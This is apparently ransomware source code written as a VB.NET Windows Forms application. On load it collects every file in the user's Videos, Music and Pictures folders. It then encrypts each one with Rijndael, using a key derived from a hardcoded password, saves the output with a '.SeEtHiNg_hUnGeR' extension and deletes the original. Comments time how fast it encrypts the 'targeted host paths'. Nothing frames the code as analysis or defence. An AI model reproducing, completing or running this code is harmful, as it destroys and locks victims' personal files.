Imports System.IO
Imports System.Security.Cryptography

Public Class Form1

#Region "GLOBAL DECLARATION"
    'TARGETED HOST PATHS | FACTORS: IT TAKES 1:18 (MINUTES) TO ENCRYPT 3 DIRECTORIES
    Private user As String = "\Users\"
    Private machina As String = Environment.UserName & Environment.MachineName()
    Private Videos As String = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)
    Private Music As String = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
    Private Pics As String = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
    'ERROR HANDLING GLOBALLY | GOOD METHOD, HOWEVER IT SLOWS THE ENCRYPTION TIME 
    'Private Shared generalSwitch As New TraceSwitch("General", "Entire Application")
    'HASHING FILTERS | FILESTREAM
    Private FILTER_OUTPUT As FileStream
    Private ENCRYPT_DIRECTORIES As String
    Private DECRYPT_DIRECTORIES As String
    Private FILTER_INPUT As FileStream
    Private HOST As String
#End Region

#Region "PROCESS INITIATIVE"
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

            For Each foundFile As String In My.Computer.FileSystem.GetFiles(Videos, FileIO.SearchOption.SearchAllSubDirectories) 'VIDEOS DIRECTORIES
                Dim a As Integer = &HA
                Do
                    If (a = &HF) Then
                        If foundFile.EndsWith(".SeEtHiNg_hUnGeR") Then
                        Else
                            ListBox1.Items.Add(foundFile)

                        End If
                        a += &H1
                        Continue Do
                        If foundFile.EndsWith(".SeEtHiNg_hUnGeR") Then
                        Else
                            ListBox1.Items.Add(foundFile)

                        End If

                    End If
                    Console.WriteLine("value of a: {0}", a)
                    a += &H1
                Loop While (a < &H14)

            Next

            For Each foundFile As String In My.Computer.FileSystem.GetFiles(Music, FileIO.SearchOption.SearchAllSubDirectories) 'MUSIC DIRECTORY
                Dim a As Integer = &HA
                Do
                    If (a = &HF) Then
                        If foundFile.EndsWith(".SeEtHiNg_hUnGeR") Then
                        Else
                            ListBox1.Items.Add(foundFile)

                        End If
                        a += &H1
                        Continue Do
                        If foundFile.EndsWith(".SeEtHiNg_hUnGeR") Then
                        Else
                            ListBox1.Items.Add(foundFile)

                        End If
                    End If
                    Console.WriteLine("value of a: {0}", a)
                    a += &H1
                Loop While (a < &H14)

            Next

            For Each foundFile As String In My.Computer.FileSystem.GetFiles(Pics, FileIO.SearchOption.SearchAllSubDirectories) 'PICTURES DIRECTORIES
                Dim a As Integer = &HA
                Do
                    If (a = &HF) Then
                        If foundFile.EndsWith(".SeEtHiNg_hUnGeR") Then
                        Else
                            ListBox1.Items.Add(foundFile)

                        End If
                        a += &H1
                        Continue Do
                        If foundFile.EndsWith(".SeEtHiNg_hUnGeR") Then
                        Else
                            ListBox1.Items.Add(foundFile)

                        End If
                    End If
                    Console.WriteLine("value of a: {0}", a)
                    a += &H1
                Loop While (a < &H14)
            Next

        End Sub
#End Region

#Region "HASHING PROCESS"
        Public Function GUARDIAN(PASSMANAGER As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim Data() As Char = PASSMANAGER.ToCharArray
        'Use intLength to get strPassword size.
        Dim Length As Integer = Data.GetUpperBound(0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim HASH_DATA(Length) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer = 0 To Data.GetUpperBound(0)
            HASH_DATA(i) = CByte(Asc(Data(i)))
        Next

        'Declare what hash to use.
        Dim SHA512 As New SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim HASH_RESULT As Byte() = SHA512.ComputeHash(HASH_DATA)
        'Declare bytKey(31).  It will hold 256 bits.
        Dim KEY(&H1F) As Byte

        'Use For Next to put a specific size (256 bits) of
        'bytResult into bytKey. The 0 To 31 will put the first 256 bits
        'of 512 bits into bytKey.
        For i As Integer = &H0 To &H1F
            KEY(i) = HASH_RESULT(i)
        Next

        Return KEY 'Return the key.
        End Function
        Public Function CREATION_POOL(PASSMANAGER As String) As Byte()
            'Convert strPassword to an array and store in chrData.
            Dim Data() As Char = PASSMANAGER.ToCharArray
            'Use intLength to get strPassword size.
            Dim Length As Integer = Data.GetUpperBound(0)
            'Declare bytDataToHash and make it the same size as chrData.
            Dim HASH_DATA(Length) As Byte

            'Use For Next to convert and store chrData into bytDataToHash.
            For i As Integer = 0 To Data.GetUpperBound(0)
                HASH_DATA(i) = CByte(Asc(Data(i)))
            Next

        'Declare bytIV(15).  It will hold 128 bits.
        Dim IV(&HF) As Byte

        'Use For Next to put a specific size (128 bits) of
        'bytResult into bytIV. The 0 To 30 for bytKey used the first 256 bits.
        'of the hashed password. The 32 To 47 will put the next 128 bits into bytIV.
        For i As Integer = &H20 To &H2F

            'Declare what hash to use.
            Dim SHA512 As New SHA512Managed
            'Declare bytResult, Hash bytDataToHash and store it in bytResult.
            Dim Result As Byte() = SHA512.ComputeHash(HASH_DATA)
            IV(i - &H20) = Result(i)
        Next

        Return IV 'return the IV
        End Function
        Public Enum CryptoAction
        'Define the enumeration for CryptoAction.
        HashEncrypt = 1
        HashDecrypt = 2
    End Enum

    Public Sub HASH_PASSAGE(ENCRYPT_DIRECTORIES As String,
                                          DECRYPT_DIRECTORIES As String,
                                          Key() As Byte,
                                          IV() As Byte,
                                          Guide As CryptoAction)
        Try 'In case of errors.
            'Setup file streams to handle input and output.
            FILTER_INPUT = New FileStream(ENCRYPT_DIRECTORIES, FileMode.Open,
                                                   FileAccess.Read)
            FILTER_OUTPUT = New FileStream(DECRYPT_DIRECTORIES, FileMode.OpenOrCreate,
                                                    FileAccess.Write)
            FILTER_OUTPUT.SetLength(0) 'make sure fsOutput is empty
            'Setup Progress Bar
            ProgressBar2.Value = 0
            ProgressBar2.Maximum = 100
            Dim ICESTREAM As CryptoStream
            'Declare your CryptoServiceProvider.
            Dim RijndaelCryptography As New RijndaelManaged
            'Determine if ecryption or decryption and setup CryptoStream.
            Select Case Guide
                Case CryptoAction.HashEncrypt
                    ICESTREAM = New CryptoStream(FILTER_OUTPUT,
                        RijndaelCryptography.CreateEncryptor(Key, IV),
                        CryptoStreamMode.Write)

                Case CryptoAction.HashDecrypt
                    ICESTREAM = New CryptoStream(FILTER_OUTPUT,
                        RijndaelCryptography.CreateDecryptor(Key, IV),
                        CryptoStreamMode.Write)
            End Select
            Dim LENGTH_PROTOCOL As Long = FILTER_INPUT.Length 'the input file's length
            Dim RUNNING_COUNT_BYTE_PROCESS As Long = 0 'running count of bytes processed
            'Use While to loop until all of the file is processed.
            While RUNNING_COUNT_BYTE_PROCESS < LENGTH_PROTOCOL

                'Declare variables for encrypt/decrypt process.
                Dim BLOCK_BYTE(4096) As Byte 'holds a block of bytes for processing
                'Read file with the input filestream.
                Dim CURRENT_BYTE_PROCESSED As Integer = FILTER_INPUT.Read(BLOCK_BYTE, 0, 4096) 'current bytes being processed
                'Write output file with the cryptostream.
#Disable Warning BC42104 ' Variable is used before it has been assigned a value
                ICESTREAM.Write(BLOCK_BYTE, 0, CURRENT_BYTE_PROCESSED)
#Enable Warning BC42104 ' Variable is used before it has been assigned a value
                'Update lngBytesProcessed
                RUNNING_COUNT_BYTE_PROCESS += CLng(CURRENT_BYTE_PROCESSED)
                'Update Progress Bar
                ProgressBar2.Value = CInt((RUNNING_COUNT_BYTE_PROCESS / LENGTH_PROTOCOL) * 100)
            End While

            'Close FileStreams and CryptoStream.
            ICESTREAM.Close()
            FILTER_INPUT.Close()
            FILTER_OUTPUT.Close()

            'If encrypting then delete the original unencrypted file.
            If Guide = CryptoAction.HashEncrypt Then
                Dim UNIQUE As New FileInfo(ENCRYPT_DIRECTORIES)
                UNIQUE.Delete()
            End If

            'If decrypting then delete the encrypted file.
            If Guide = CryptoAction.HashDecrypt Then
                Dim BLISTER As New FileInfo(DECRYPT_DIRECTORIES)
                BLISTER.Delete()
            End If
            'Update the user when the file is done.
            Dim UPDATER As String = $"{Chr(&HD)}{Chr(&HA)}"
            If Guide = CryptoAction.HashEncrypt Then
                Debug.WriteLine("Encryption Complete" + UPDATER + UPDATER +
                            "Total bytes processed = " +
                            RUNNING_COUNT_BYTE_PROCESS.ToString,
                             "Done")

                'Update the progress bar and Listbox
            Else
                'Update the user when the file is done.
                Debug.WriteLine("Decryption Complete" + UPDATER + UPDATER +
                           "Total bytes processed = " +
                            RUNNING_COUNT_BYTE_PROCESS.ToString,
                            "Done")

                'Update the progress bar and Listbox

            End If

        Catch When Err.Number = &H35 'if file not found
                Debug.WriteLine("Please check to make sure the path and filename" +
                            "are correct and if the file exists.",
                             "Invalid Path or Filename")

                'Catch file not found error.

                'Catch all other errors. And delete partial files.
            Catch
            FILTER_INPUT.Close()
            FILTER_OUTPUT.Close()

            If Guide = CryptoAction.HashDecrypt Then
                Dim UPDATER As New FileInfo(HOST)
                UPDATER.Delete()
            Else
                Dim UPDATER As New FileInfo(HOST)
                UPDATER.Delete()
            End If

        End Try
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
            ProgressBar1.Maximum = ListBox1.Items.Count
            If ProgressBar1.Value = ListBox1.Items.Count Then
                Timer1.Stop()

            Else

                ListBox1.SelectedIndex = ProgressBar1.Value

                ListBox1.SelectionMode = SelectionMode.One
                HOST = CStr(ListBox1.SelectedItem)
                Try
                'Send the password to the CreateKey function.
                Dim Key As Byte() = GUARDIAN("CRYPTO_IS_ETERNAL")
                'Send the password to the CreateIV function.
                Dim IV As Byte() = CREATION_POOL("CRYPTO_IS_ETERNAL")
                'Start the encryption.
                HASH_PASSAGE(HOST, HOST + ".SeEtHiNg_hUnGeR",
                                         Key, IV, CryptoAction.HashEncrypt)
            Catch ex As Exception
                End Try
                ProgressBar1.Increment(1)
            End If
        End Sub
#End Region
        Public Delegate Sub ProgressReportDelegate(value As Int32)

    Private Sub ReportProgress(v As Int32)
        If progBar.InvokeRequired Then
            progBar.Invoke(Sub() progBar.Value = v)
        Else
            progBar.Value = v
            progBar.Invalidate()
        End If
    End Sub

    'GLOBAL ERROR MESSAGING
    'https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.debug.writeline?view=net-9.0
    ' Public Shared Sub MyErrorMethod(category As String)
    'If 'generalSwitch.TraceError Then Debug.Write("My error message. ")
    'If 'generalSwitch.TraceVerbose Then Debug.WriteLine("My second error message.", category)
    ' End Sub

End Class
